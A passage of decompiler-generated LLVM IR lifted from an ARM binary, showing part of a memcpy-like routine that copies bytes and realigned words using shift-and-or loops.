  store i1 %v7_14c4c, i1* @cpsr_z, align 1
  br i1 %v7_14c4c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_14c50 = load i8*, i8** %stack_var_-8, align 4
  %v4_14c50 = ptrtoint i8* %v3_14c50 to i32
  store i32 %v4_14c50, i32* %r0.global-to-local, align 4
  ret i32 %v4_14c50

bb135:                                            ; preds = %bb133
  %v1_14c54 = add i32 %v0_14c4c, 2
  %v3_14c54 = sub i32 -3, %v0_14c4c
  %v4_14c54 = and i32 %v3_14c54, %v1_14c4c
  %v5_14c54 = icmp slt i32 %v4_14c54, 0
  store i1 %v5_14c54, i1* %cpsr_v.global-to-local, align 1
  %v6_14c54 = icmp slt i32 %v1_14c54, 0
  store i1 %v6_14c54, i1* %cpsr_n.global-to-local, align 1
  %v7_14c54 = icmp eq i32 %v1_14c4c, 2
  store i1 %v7_14c54, i1* @cpsr_z, align 1
  %v0_14c58 = load i32, i32* @r1, align 4
  %v1_14c58 = inttoptr i32 %v0_14c58 to i8*
  %v2_14c58 = load i8, i8* %v1_14c58, align 1
  %v3_14c58 = zext i8 %v2_14c58 to i32
  store i32 %v3_14c58, i32* %r3.global-to-local, align 4
  %v5_14c58 = add i32 %v0_14c58, 1
  store i32 %v5_14c58, i32* @r1, align 4
  %v3_14c5c = inttoptr i32 %v2_14c5c to i8*
  store i8 %v2_14c58, i8* %v3_14c5c, align 1
  %v4_14c5c = load i32, i32* %r0.global-to-local, align 4
  %v5_14c5c = add i32 %v4_14c5c, 1
  store i32 %v5_14c5c, i32* %r0.global-to-local, align 4
  %v0_14c60 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14c60 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14c60 = xor i1 %v0_14c60, %v1_14c60
  br i1 %v2_14c60, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_14c60 = load i32, i32* @r1, align 4
  %v4_14c60 = inttoptr i32 %v3_14c60 to i8*
  %v5_14c60 = load i8, i8* %v4_14c60, align 1
  %v6_14c60 = zext i8 %v5_14c60 to i32
  store i32 %v6_14c60, i32* %r3.global-to-local, align 4
  %v8_14c60 = add i32 %v3_14c60, 1
  store i32 %v8_14c60, i32* @r1, align 4
  %v6_14c64 = inttoptr i32 %v5_14c5c to i8*
  store i8 %v5_14c60, i8* %v6_14c64, align 1
  %v7_14c64 = load i32, i32* %r0.global-to-local, align 4
  %v8_14c64 = add i32 %v7_14c64, 1
  store i32 %v8_14c64, i32* %r0.global-to-local, align 4
  %v1_14c68.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14c68.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_14c6c = phi i32 [ %v8_14c64, %bb136 ], [ %v5_14c5c, %bb135 ]
  %v2_14c6c = phi i1 [ %v2_14c68.pre, %bb136 ], [ %v1_14c60, %bb135 ]
  %v1_14c6c = phi i1 [ %v1_14c68.pre, %bb136 ], [ %v0_14c60, %bb135 ]
  %v0_14c68 = load i1, i1* @cpsr_z, align 1
  %v3_14c68 = xor i1 %v2_14c6c, %v1_14c6c
  %v4_14c68 = or i1 %v0_14c68, %v3_14c68
  br i1 %v4_14c68, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_14c68 = load i32, i32* @r1, align 4
  %v6_14c68 = inttoptr i32 %v5_14c68 to i8*
  %v7_14c68 = load i8, i8* %v6_14c68, align 1
  %v8_14c68 = zext i8 %v7_14c68 to i32
  store i32 %v8_14c68, i32* %r3.global-to-local, align 4
  %v10_14c68 = add i32 %v5_14c68, 1
  store i32 %v10_14c68, i32* @r1, align 4
  %v8_14c6c = inttoptr i32 %v7_14c6c to i8*
  store i8 %v7_14c68, i8* %v8_14c6c, align 1
  %v9_14c6c = load i32, i32* %r0.global-to-local, align 4
  %v10_14c6c = add i32 %v9_14c6c, 1
  store i32 %v10_14c6c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_14c70 = load i8*, i8** %stack_var_-8, align 4
  %v3_14c70 = ptrtoint i8* %v2_14c70 to i32
  store i32 %v3_14c70, i32* %r0.global-to-local, align 4
  ret i32 %v3_14c70

dec_label_pc_14c74:                               ; preds = %dec_label_pc_14bc8
  %v1_14c74 = sub nsw i32 4, %v1_14bc8
  store i32 %v1_14c74, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14c78 = icmp ult i32 %v1_14c74, 2
  store i1 %v8_14c78, i1* %cpsr_n.global-to-local, align 1
  %v1_14c7c = inttoptr i32 %v0_14bb0 to i8*
  %v2_14c7c = load i8, i8* %v1_14c7c, align 1
  %v3_14c7c = zext i8 %v2_14c7c to i32
  store i32 %v3_14c7c, i32* %r3.global-to-local, align 4
  %v5_14c7c = add i32 %v0_14bb0, 1
  store i32 %v5_14c7c, i32* @r1, align 4
  store i8 %v2_14c7c, i8* %v5_14bbc, align 1
  %v4_14c80 = load i32, i32* %r0.global-to-local, align 4
  %v5_14c80 = add i32 %v4_14c80, 1
  store i32 %v5_14c80, i32* %r0.global-to-local, align 4
  br i1 %v8_14c78, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_14c74
  %v9_14c78 = icmp eq i32 %v1_14c74, 2
  %v6_14c84 = load i32, i32* @r1, align 4
  %v7_14c84 = inttoptr i32 %v6_14c84 to i8*
  %v8_14c84 = load i8, i8* %v7_14c84, align 1
  %v9_14c84 = zext i8 %v8_14c84 to i32
  store i32 %v9_14c84, i32* %r3.global-to-local, align 4
  %v11_14c84 = add i32 %v6_14c84, 1
  store i32 %v11_14c84, i32* @r1, align 4
  %v9_14c88 = inttoptr i32 %v5_14c80 to i8*
  store i8 %v8_14c84, i8* %v9_14c88, align 1
  %v10_14c88 = load i32, i32* %r0.global-to-local, align 4
  %v11_14c88 = add i32 %v10_14c88, 1
  store i32 %v11_14c88, i32* %r0.global-to-local, align 4
  br i1 %v9_14c78, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_14c8c = load i32, i32* @r1, align 4
  %v9_14c8c = inttoptr i32 %v8_14c8c to i8*
  %v10_14c8c = load i8, i8* %v9_14c8c, align 1
  %v11_14c8c = zext i8 %v10_14c8c to i32
  store i32 %v11_14c8c, i32* %r3.global-to-local, align 4
  %v13_14c8c = add i32 %v8_14c8c, 1
  store i32 %v13_14c8c, i32* @r1, align 4
  %v11_14c90 = inttoptr i32 %v11_14c88 to i8*
  store i8 %v10_14c8c, i8* %v11_14c90, align 1
  %v12_14c90 = load i32, i32* %r0.global-to-local, align 4
  %v13_14c90 = add i32 %v12_14c90, 1
  store i32 %v13_14c90, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_14c74, %bb139
  %v0_14cec76 = phi i32 [ %v11_14c88, %bb138 ], [ %v5_14c80, %dec_label_pc_14c74 ], [ %v13_14c90, %bb139 ]
  %v0_14c94 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c94 = load i32, i32* @ip, align 4
  %v2_14c94 = sub i32 %v0_14c94, %v1_14c94
  store i32 %v2_14c94, i32* %r2.global-to-local, align 4
  %v4_14c94 = xor i32 %v1_14c94, %v0_14c94
  %v5_14c94 = xor i32 %v2_14c94, %v0_14c94
  %v6_14c94 = and i32 %v5_14c94, %v4_14c94
  %v7_14c94 = icmp slt i32 %v6_14c94, 0
  store i1 %v7_14c94, i1* %cpsr_v.global-to-local, align 1
  %v8_14c94 = icmp slt i32 %v2_14c94, 0
  store i1 %v8_14c94, i1* %cpsr_n.global-to-local, align 1
  %v5_14c98 = icmp slt i32 %v0_14c94, %v1_14c94
  br i1 %v5_14c98, label %bb133, label %dec_label_pc_14c9c

dec_label_pc_14c9c:                               ; preds = %.thread12
  %v0_14c9c = load i32, i32* @r1, align 4
  %v1_14c9c = urem i32 %v0_14c9c, 4
  store i32 %v1_14c9c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14c9c = icmp eq i32 %v1_14c9c, 0
  %extract.t124 = trunc i32 %v0_14c9c to i2
  br i1 %v2_14c9c, label %dec_label_pc_14bd8, label %dec_label_pc_14ca4

dec_label_pc_14ca4:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14c9c
  %v0_14cec75 = phi i32 [ %v1_14bb0, %dec_label_pc_14bd0 ], [ %v0_14cec76, %dec_label_pc_14c9c ]
  %v0_14d98 = phi i32 [ %v2_14bc0, %dec_label_pc_14bd0 ], [ %v2_14c94, %dec_label_pc_14c9c ]
  %v0_14cac.off0 = phi i2 [ %extract.t, %dec_label_pc_14bd0 ], [ %extract.t124, %dec_label_pc_14c9c ]
  %v0_14ca4 = phi i32 [ %v0_14bb0, %dec_label_pc_14bd0 ], [ %v0_14c9c, %dec_label_pc_14c9c ]
  %v1_14ca4 = and i32 %v0_14ca4, -4
  store i32 %v1_14ca4, i32* %r1.global-to-local, align 4
  %v1_14ca8 = inttoptr i32 %v1_14ca4 to i32*
  %v2_14ca8 = load i32, i32* %v1_14ca8, align 4
  store i32 %v2_14ca8, i32* @lr, align 4
  %v4_14ca8 = add i32 %v1_14ca4, 4
  store i32 %v4_14ca8, i32* %r1.global-to-local, align 4
  %v2_14d90 = add i32 %v0_14d98, -12
  %v4_14d90 = sub i32 11, %v0_14d98
  %v5_14d90 = and i32 %v4_14d90, %v0_14d98
  %v6_14d90 = icmp slt i32 %v5_14d90, 0
  store i1 %v6_14d90, i1* %cpsr_v.global-to-local, align 1
  %v7_14d90 = icmp slt i32 %v2_14d90, 0
  store i1 %v7_14d90, i1* %cpsr_n.global-to-local, align 1
  %v5_14d94 = icmp slt i32 %v0_14d98, 12
  switch i2 %v0_14cac.off0, label %dec_label_pc_14cb8 [
    i2 -1, label %dec_label_pc_14d90
    i2 -2, label %dec_label_pc_14d24
  ]

dec_label_pc_14cb8:                               ; preds = %dec_label_pc_14ca4
  br i1 %v5_14d94, label %dec_label_pc_14d04, label %dec_label_pc_14cc0

dec_label_pc_14cc0:                               ; preds = %dec_label_pc_14cb8
  store i32 %v2_14d90, i32* %r2.global-to-local, align 4
  %v3_14cc4 = load i32, i32* @r4, align 4
  store i32 %v3_14cc4, i32* %stack_var_-16, align 4
  %v6_14cc4 = load i32, i32* @r5, align 4
  store i32 %v6_14cc4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cc8.dec_label_pc_14cc8_crit_edge, %dec_label_pc_14cc0
  %v0_14cec = phi i32 [ %v12_14cec, %dec_label_pc_14cc8.dec_label_pc_14cc8_crit_edge ], [ %v0_14cec75, %dec_label_pc_14cc0 ]
  %v0_14ccc = phi i32 [ %v0_14ccc.pre, %dec_label_pc_14cc8.dec_label_pc_14cc8_crit_edge ], [ %v4_14ca8, %dec_label_pc_14cc0 ]
  %v0_14cc8 = phi i32 [ %v0_14cc8.pre, %dec_label_pc_14cc8.dec_label_pc_14cc8_crit_edge ], [ %v2_14ca8, %dec_label_pc_14cc0 ]
  %v3_14cc8 = udiv i32 %v0_14cc8, 256
  store i32 %v3_14cc8, i32* %r3.global-to-local, align 4
  %v1_14ccc = inttoptr i32 %v0_14ccc to i32*
  %v2_14ccc = load i32, i32* %v1_14ccc, align 4
  store i32 %v2_14ccc, i32* %r4.global-to-local, align 4
  %v3_14ccc = add i32 %v0_14ccc, 4
  %v4_14ccc = inttoptr i32 %v3_14ccc to i32*
  %v5_14ccc = load i32, i32* %v4_14ccc, align 4
  store i32 %v5_14ccc, i32* %r5.global-to-local, align 4
  %v6_14ccc = add i32 %v0_14ccc, 8
  %v7_14ccc = inttoptr i32 %v6_14ccc to i32*
  %v8_14ccc = load i32, i32* %v7_14ccc, align 4
  store i32 %v8_14ccc, i32* %ip.global-to-local, align 4
  %v9_14ccc = add i32 %v0_14ccc, 12
  %v10_14ccc = inttoptr i32 %v9_14ccc to i32*
  %v11_14ccc = load i32, i32* %v10_14ccc, align 4
  store i32 %v11_14ccc, i32* @lr, align 4
  %v12_14ccc = add i32 %v0_14ccc, 16
  store i32 %v12_14ccc, i32* %r1.global-to-local, align 4
  %v4_14cd0 = mul i32 %v2_14ccc, 16777216
  %v5_14cd0 = or i32 %v4_14cd0, %v3_14cc8
  store i32 %v5_14cd0, i32* %r3.global-to-local, align 4
  %v3_14cd4 = udiv i32 %v2_14ccc, 256
  %v4_14cd8 = mul i32 %v5_14ccc, 16777216
  %v5_14cd8 = or i32 %v4_14cd8, %v3_14cd4
  store i32 %v5_14cd8, i32* %r4.global-to-local, align 4
  %v3_14cdc = udiv i32 %v5_14ccc, 256
  %v4_14ce0 = mul i32 %v8_14ccc, 16777216
  %v5_14ce0 = or i32 %v4_14ce0, %v3_14cdc
  store i32 %v5_14ce0, i32* %r5.global-to-local, align 4
  %v3_14ce4 = udiv i32 %v8_14ccc, 256
  %v4_14ce8 = mul i32 %v11_14ccc, 16777216
  %v5_14ce8 = or i32 %v4_14ce8, %v3_14ce4
  store i32 %v5_14ce8, i32* @ip, align 4
  %v1_14cec = inttoptr i32 %v0_14cec to i32*
  store i32 %v5_14cd0, i32* %v1_14cec, align 4
  %v3_14cec = add i32 %v0_14cec, 4
  %v4_14cec = inttoptr i32 %v3_14cec to i32*
  %v5_14cec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14cec, i32* %v4_14cec, align 4
  %v6_14cec = add i32 %v0_14cec, 8
  %v7_14cec = inttoptr i32 %v6_14cec to i32*
  %v8_14cec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14cec, i32* %v7_14cec, align 4
  %v9_14cec = add i32 %v0_14cec, 12
  %v10_14cec = inttoptr i32 %v9_14cec to i32*
  %v11_14cec = load i32, i32* @ip, align 4
  store i32 %v11_14cec, i32* %v10_14cec, align 4
  %v12_14cec = add i32 %v0_14cec, 16
  store i32 %v12_14cec, i32* %r0.global-to-local, align 4
  %v0_14cf0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14cf0 = add i32 %v0_14cf0, -16
  store i32 %v2_14cf0, i32* %r2.global-to-local, align 4
  %v6_14cf4 = icmp slt i32 %v0_14cf0, 16
  br i1 %v6_14cf4, label %dec_label_pc_14cf8, label %dec_label_pc_14cc8.dec_label_pc_14cc8_crit_edge

dec_label_pc_14cc8.dec_label_pc_14cc8_crit_edge:  ; preds = %dec_label_pc_14cc8
  %v0_14cc8.pre = load i32, i32* @lr, align 4
  %v0_14ccc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14cc8

dec_label_pc_14cf8:                               ; preds = %dec_label_pc_14cc8
  %v2_14cf8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14cf8, i32* @r4, align 4
  %v5_14cf8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14cf8, i32* @r5, align 4
  %v2_14cfc = add i32 %v0_14cf0, -4
  store i32 %v2_14cfc, i32* %r2.global-to-local, align 4
  %v4_14cfc = add i32 %v0_14cf0, 2147483632
  %v5_14cfc = and i32 %v2_14cfc, %v4_14cfc
  %v6_14cfc = icmp slt i32 %v5_14cfc, 0
  store i1 %v6_14cfc, i1* %cpsr_v.global-to-local, align 1
  %v7_14cfc = icmp slt i32 %v2_14cfc, 0
  store i1 %v7_14cfc, i1* %cpsr_n.global-to-local, align 1
  %v5_14d00 = icmp slt i32 %v2_14cf0, -12
  br i1 %v5_14d00, label %dec_label_pc_14d1c, label %dec_label_pc_14d04

dec_label_pc_14d04:                               ; preds = %dec_label_pc_14cf8, %dec_label_pc_14cb8, %dec_label_pc_14d04
  %v1_14d10 = phi i32 [ %v4_14d10, %dec_label_pc_14d04 ], [ %v12_14cec, %dec_label_pc_14cf8 ], [ %v0_14cec75, %dec_label_pc_14cb8 ]
  %v0_14d04 = load i32, i32* @lr, align 4
  %v3_14d04 = udiv i32 %v0_14d04, 256
  store i32 %v3_14d04, i32* %ip.global-to-local, align 4
  %v0_14d08 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d08 = inttoptr i32 %v0_14d08 to i32*
  %v2_14d08 = load i32, i32* %v1_14d08, align 4
  store i32 %v2_14d08, i32* @lr, align 4
  %v4_14d08 = add i32 %v0_14d08, 4
  store i32 %v4_14d08, i32* %r1.global-to-local, align 4
  %v4_14d0c = mul i32 %v2_14d08, 16777216
  %v5_14d0c = or i32 %v4_14d0c, %v3_14d04
  store i32 %v5_14d0c, i32* @ip, align 4
  %v2_14d10 = inttoptr i32 %v1_14d10 to i32*
  store i32 %v5_14d0c, i32* %v2_14d10, align 4
  %v3_14d10 = load i32, i32* %r0.global-to-local, align 4
  %v4_14d10 = add i32 %v3_14d10, 4
  store i32 %v4_14d10, i32* %r0.global-to-local, align 4
  %v0_14d14 = load i32, i32* %r2.global-to-local, align 4
  %v2_14d14 = add i32 %v0_14d14, -4
  store i32 %v2_14d14, i32* %r2.global-to-local, align 4
  %v6_14d18 = icmp slt i32 %v0_14d14, 4
  br i1 %v6_14d18, label %dec_label_pc_14d1c.loopexit, label %dec_label_pc_14d04

dec_label_pc_14d1c.loopexit:                      ; preds = %dec_label_pc_14d04
  %v4_14d14 = sub i32 3, %v0_14d14
  %v5_14d14 = and i32 %v4_14d14, %v0_14d14
  %v6_14d14 = icmp slt i32 %v5_14d14, 0
  %v7_14d14 = icmp slt i32 %v2_14d14, 0
  store i1 %v6_14d14, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14d14, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14d1c

dec_label_pc_14d1c:                               ; preds = %dec_label_pc_14d1c.loopexit, %dec_label_pc_14cf8
  %v2_14c5c113 = phi i32 [ %v4_14d10, %dec_label_pc_14d1c.loopexit ], [ %v12_14cec, %dec_label_pc_14cf8 ]
  %v0_14c4c109 = phi i32 [ %v2_14d14, %dec_label_pc_14d1c.loopexit ], [ %v2_14cfc, %dec_label_pc_14cf8 ]
  %v0_14d1c = load i32, i32* %r1.global-to-local, align 4
  %v1_14d1c = add i32 %v0_14d1c, -3
  store i32 %v1_14d1c, i32* @r1, align 4
  br label %bb133

dec_label_pc_14d24:                               ; preds = %dec_label_pc_14ca4
  br i1 %v5_14d94, label %dec_label_pc_14d70, label %dec_label_pc_14d2c

dec_label_pc_14d2c:                               ; preds = %dec_label_pc_14d24
  store i32 %v2_14d90, i32* %r2.global-to-local, align 4
  %v3_14d30 = load i32, i32* @r4, align 4
  store i32 %v3_14d30, i32* %stack_var_-16, align 4
  %v6_14d30 = load i32, i32* @r5, align 4
  store i32 %v6_14d30, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14d34

dec_label_pc_14d34:                               ; preds = %dec_label_pc_14d34.dec_label_pc_14d34_crit_edge, %dec_label_pc_14d2c
  %v0_14d58 = phi i32 [ %v12_14d58, %dec_label_pc_14d34.dec_label_pc_14d34_crit_edge ], [ %v0_14cec75, %dec_label_pc_14d2c ]
  %v0_14d38 = phi i32 [ %v0_14d38.pre, %dec_label_pc_14d34.dec_label_pc_14d34_crit_edge ], [ %v4_14ca8, %dec_label_pc_14d2c ]
  %v0_14d34 = phi i32 [ %v0_14d34.pre, %dec_label_pc_14d34.dec_label_pc_14d34_crit_edge ], [ %v2_14ca8, %dec_label_pc_14d2c ]
  %v3_14d34 = udiv i32 %v0_14d34, 65536
  store i32 %v3_14d34, i32* %r3.global-to-local, align 4
  %v1_14d38 = inttoptr i32 %v0_14d38 to i32*
  %v2_14d38 = load i32, i32* %v1_14d38, align 4
  store i32 %v2_14d38, i32* %r4.global-to-local, align 4
  %v3_14d38 = add i32 %v0_14d38, 4
  %v4_14d38 = inttoptr i32 %v3_14d38 to i32*
  %v5_14d38 = load i32, i32* %v4_14d38, align 4
  store i32 %v5_14d38, i32* %r5.global-to-local, align 4
  %v6_14d38 = add i32 %v0_14d38, 8
  %v7_14d38 = inttoptr i32 %v6_14d38 to i32*
  %v8_14d38 = load i32, i32* %v7_14d38, align 4
  store i32 %v8_14d38, i32* %ip.global-to-local, align 4
  %v9_14d38 = add i32 %v0_14d38, 12
  %v10_14d38 = inttoptr i32 %v9_14d38 to i32*
  %v11_14d38 = load i32, i32* %v10_14d38, align 4
  store i32 %v11_14d38, i32* @lr, align 4
  %v12_14d38 = add i32 %v0_14d38, 16
  store i32 %v12_14d38, i32* %r1.global-to-local, align 4
  %v4_14d3c = mul i32 %v2_14d38, 65536
  %v5_14d3c = or i32 %v4_14d3c, %v3_14d34
  store i32 %v5_14d3c, i32* %r3.global-to-local, align 4
  %v3_14d40 = udiv i32 %v2_14d38, 65536
  %v4_14d44 = mul i32 %v5_14d38, 65536
  %v5_14d44 = or i32 %v4_14d44, %v3_14d40
  store i32 %v5_14d44, i32* %r4.global-to-local, align 4
  %v3_14d48 = udiv i32 %v5_14d38, 65536
  %v4_14d4c = mul i32 %v8_14d38, 65536
  %v5_14d4c = or i32 %v4_14d4c, %v3_14d48
  store i32 %v5_14d4c, i32* %r5.global-to-local, align 4
  %v3_14d50 = udiv i32 %v8_14d38, 65536
  %v4_14d54 = mul i32 %v11_14d38, 65536
  %v5_14d54 = or i32 %v4_14d54, %v3_14d50
  store i32 %v5_14d54, i32* @ip, align 4
  %v1_14d58 = inttoptr i32 %v0_14d58 to i32*
  store i32 %v5_14d3c, i32* %v1_14d58, align 4
  %v3_14d58 = add i32 %v0_14d58, 4
  %v4_14d58 = inttoptr i32 %v3_14d58 to i32*
  %v5_14d58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14d58, i32* %v4_14d58, align 4
  %v6_14d58 = add i32 %v0_14d58, 8
  %v7_14d58 = inttoptr i32 %v6_14d58 to i32*
  %v8_14d58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14d58, i32* %v7_14d58, align 4
  %v9_14d58 = add i32 %v0_14d58, 12
  %v10_14d58 = inttoptr i32 %v9_14d58 to i32*
  %v11_14d58 = load i32, i32* @ip, align 4
  store i32 %v11_14d58, i32* %v10_14d58, align 4
  %v12_14d58 = add i32 %v0_14d58, 16
  store i32 %v12_14d58, i32* %r0.global-to-local, align 4
  %v0_14d5c = load i32, i32* %r2.global-to-local, align 4
  %v2_14d5c = add i32 %v0_14d5c, -16
  store i32 %v2_14d5c, i32* %r2.global-to-local, align 4
  %v6_14d60 = icmp slt i32 %v0_14d5c, 16
  br i1 %v6_14d60, label %dec_label_pc_14d64, label %dec_label_pc_14d34.dec_label_pc_14d34_crit_edge

dec_label_pc_14d34.dec_label_pc_14d34_crit_edge:  ; preds = %dec_label_pc_14d34
  %v0_14d34.pre = load i32, i32* @lr, align 4
  %v0_14d38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14d34

dec_label_pc_14d64:                               ; preds = %dec_label_pc_14d34
  %v2_14d64 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d64, i32* @r4, align 4
  %v5_14d64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14d64, i32* @r5, align 4
  %v2_14d68 = add i32 %v0_14d5c, -4
  store i32 %v2_14d68, i32* %r2.global-to-local, align 4
  %v4_14d68 = add i32 %v0_14d5c, 2147483632
  %v5_14d68 = and i32 %v2_14d68, %v4_14d68
  %v6_14d68 = icmp slt i32 %v5_14d68, 0
  store i1 %v6_14d68, i1* %cpsr_v.global-to-local, align 1
  %v7_14d68 = icmp slt i32 %v2_14d68, 0
  store i1 %v7_14d68, i1* %cpsr_n.global-to-local, align 1
  %v5_14d6c = icmp slt i32 %v2_14d5c, -12
  br i1 %v5_14d6c, label %dec_label_pc_14d88, label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d64, %dec_label_pc_14d24, %dec_label_pc_14d70
  %v1_14d7c = phi i32 [ %v4_14d7c, %dec_label_pc_14d70 ], [ %v12_14d58, %dec_label_pc_14d64 ], [ %v0_14cec75, %dec_label_pc_14d24 ]
  %v0_14d70 = load i32, i32* @lr, align 4
  %v3_14d70 = udiv i32 %v0_14d70, 65536
  store i32 %v3_14d70, i32* %ip.global-to-local, align 4
  %v0_14d74 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d74 = inttoptr i32 %v0_14d74 to i32*
  %v2_14d74 = load i32, i32* %v1_14d74, align 4
  store i32 %v2_14d74, i32* @lr, align 4
  %v4_14d74 = add i32 %v0_14d74, 4
  store i32 %v4_14d74, i32* %r1.global-to-local, align 4
  %v4_14d78 = mul i32 %v2_14d74, 65536
  %v5_14d78 = or i32 %v4_14d78, %v3_14d70
  store i32 %v5_14d78, i32* @ip, align 4
  %v2_14d7c = inttoptr i32 %v1_14d7c to i32*
  store i32 %v5_14d78, i32* %v2_14d7c, align 4
  %v3_14d7c = load i32, i32* %r0.global-to-local, align 4
  %v4_14d7c = add i32 %v3_14d7c, 4
  store i32 %v4_14d7c, i32* %r0.global-to-local, align 4
  %v0_14d80 = load i32, i32* %r2.global-to-local, align 4
  %v2_14d80 = add i32 %v0_14d80, -4
  store i32 %v2_14d80, i32* %r2.global-to-local, align 4
  %v6_14d84 = icmp slt i32 %v0_14d80, 4
  br i1 %v6_14d84, label %dec_label_pc_14d88.loopexit, label %dec_label_pc_14d70

dec_label_pc_14d88.loopexit:                      ; preds = %dec_label_pc_14d70
  %v4_14d80 = sub i32 3, %v0_14d80
  %v5_14d80 = and i32 %v4_14d80, %v0_14d80
  %v6_14d80 = icmp slt i32 %v5_14d80, 0
  %v7_14d80 = icmp slt i32 %v2_14d80, 0
  store i1 %v6_14d80, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14d80, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14d88

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d88.loopexit, %dec_label_pc_14d64
  %v2_14c5c112 = phi i32 [ %v4_14d7c, %dec_label_pc_14d88.loopexit ], [ %v12_14d58, %dec_label_pc_14d64 ]
  %v0_14c4c108 = phi i32 [ %v2_14d80, %dec_label_pc_14d88.loopexit ], [ %v2_14d68, %dec_label_pc_14d64 ]
  %v0_14d88 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d88 = add i32 %v0_14d88, -2
  store i32 %v1_14d88, i32* @r1, align 4
  br label %bb133

dec_label_pc_14d90:                               ; preds = %dec_label_pc_14ca4
  br i1 %v5_14d94, label %dec_label_pc_14ddc, label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d90
  store i32 %v2_14d90, i32* %r2.global-to-local, align 4
  %v3_14d9c = load i32, i32* @r4, align 4
  store i32 %v3_14d9c, i32* %stack_var_-16, align 4
  %v6_14d9c = load i32, i32* @r5, align 4
  store i32 %v6_14d9c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14da0

dec_label_pc_14da0:                               ; preds = %dec_label_pc_14da0.dec_label_pc_14da0_crit_edge, %dec_label_pc_14d98
  %v0_14dc4 = phi i32 [ %v12_14dc4, %dec_label_pc_14da0.dec_label_pc_14da0_crit_edge ], [ %v0_14cec75, %dec_label_pc_14d98 ]
  %v0_14da4 = phi i32 [ %v0_14da4.pre, %dec_label_pc_14da0.dec_label_pc_14da0_crit_edge ], [ %v4_14ca8, %dec_label_pc_14d98 ]
  %v0_14da0 = phi i32 [ %v0_14da0.pre, %dec_label_pc_14da0.dec_label_pc_14da0_crit_edge ], [ %v2_14ca8, %dec_label_pc_14d98 ]
  %v3_14da0 = udiv i32 %v0_14da0, 16777216
  store i32 %v3_14da0, i32* %r3.global-to-local, align 4
  %v1_14da4 = inttoptr i32 %v0_14da4 to i32*
  %v2_14da4 = load i32, i32* %v1_14da4, align 4
  store i32 %v2_14da4, i32* %r4.global-to-local, align 4
  %v3_14da4 = add i32 %v0_14da4, 4
  %v4_14da4 = inttoptr i32 %v3_14da4 to i32*
  %v5_14da4 = load i32, i32* %v4_14da4, align 4
  store i32 %v5_14da4, i32* %r5.global-to-local, align 4
  %v6_14da4 = add i32 %v0_14da4, 8
  %v7_14da4 = inttoptr i32 %v6_14da4 to i32*
  %v8_14da4 = load i32, i32* %v7_14da4, align 4
  store i32 %v8_14da4, i32* %ip.global-to-local, align 4
  %v9_14da4 = add i32 %v0_14da4, 12
  %v10_14da4 = inttoptr i32 %v9_14da4 to i32*
  %v11_14da4 = load i32, i32* %v10_14da4, align 4
  store i32 %v11_14da4, i32* @lr, align 4
  %v12_14da4 = add i32 %v0_14da4, 16
  store i32 %v12_14da4, i32* %r1.global-to-local, align 4
  %v4_14da8 = mul i32 %v2_14da4, 256
  %v5_14da8 = or i32 %v4_14da8, %v3_14da0
  store i32 %v5_14da8, i32* %r3.global-to-local, align 4
  %v3_14dac = udiv i32 %v2_14da4, 16777216
  %v4_14db0 = mul i32 %v5_14da4, 256
  %v5_14db0 = or i32 %v4_14db0, %v3_14dac
  store i32 %v5_14db0, i32* %r4.global-to-local, align 4
  %v3_14db4 = udiv i32 %v5_14da4, 16777216
  %v4_14db8 = mul i32 %v8_14da4, 256
  %v5_14db8 = or i32 %v4_14db8, %v3_14db4
  store i32 %v5_14db8, i32* %r5.global-to-local, align 4
  %v3_14dbc = udiv i32 %v8_14da4, 16777216
  %v4_14dc0 = mul i32 %v11_14da4, 256
  %v5_14dc0 = or i32 %v4_14dc0, %v3_14dbc
  store i32 %v5_14dc0, i32* @ip, align 4
  %v1_14dc4 = inttoptr i32 %v0_14dc4 to i32*
  store i32 %v5_14da8, i32* %v1_14dc4, align 4
  %v3_14dc4 = add i32 %v0_14dc4, 4
  %v4_14dc4 = inttoptr i32 %v3_14dc4 to i32*
  %v5_14dc4 = load i32, i32* %r4.global-to-local, align 4
